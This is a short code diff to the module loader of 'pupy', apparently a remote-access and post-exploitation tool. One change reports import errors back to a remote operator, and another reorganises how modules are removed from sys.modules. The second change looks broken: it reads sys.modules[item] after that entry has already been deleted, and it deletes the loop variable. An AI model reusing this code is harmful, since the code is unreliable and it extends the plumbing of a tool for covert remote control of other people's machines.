@@ -385,7 +385,9 @@ def pupy_add_package(pkdic, compressed=False, name=None):
         try:
             __import__(name)
         except:
-            pass
+            if remote_print_error:
+                remote_print_error('Error during preimport {}: {}'.format(
+                    name, str(traceback.format_exc())))
 
     gc.collect()
 
@@ -449,9 +451,6 @@ def invalidate_module(name):
         if not (item == name or item.startswith(name+'.')):
             continue
 
-        mid = id(sys.modules[item])
-
-        dprint('Remove {} from sys.modules'.format(item))
         del sys.modules[item]
 
         if hasattr(pupy, 'namespace'):
@@ -461,6 +460,10 @@ def invalidate_module(name):
         if __debug__:
             global __debug
             if __debug:
+                mid = id(sys.modules[item])
+                dprint('Remove {} from sys.modules'.format(item))
+                del item
+
                 for obj in gc.get_objects():
                     if id(obj) == mid:
                         dprint('Module {} still referenced by {}'.format(
